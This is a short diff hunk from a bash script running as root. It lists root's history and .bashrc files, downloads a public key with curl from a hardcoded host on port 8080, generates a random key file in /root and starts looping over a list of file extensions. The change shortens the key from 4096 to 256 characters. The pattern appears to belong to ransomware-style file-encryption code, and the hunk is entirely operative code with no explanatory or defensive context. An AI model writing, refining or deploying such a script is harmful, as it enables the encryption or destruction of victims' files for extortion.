@@ -63,7 +63,7 @@ fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
 curl http://192.168.1.132:8080/pub.pem > /root/pub.pem 
 chmod 755 /root/pub.pem
 
-cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > /root/key.bin 
+cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin 
 chmod 755 /root/key.bin
 
 for ((num=0; num<"${#fileExts[@]}"; num++))
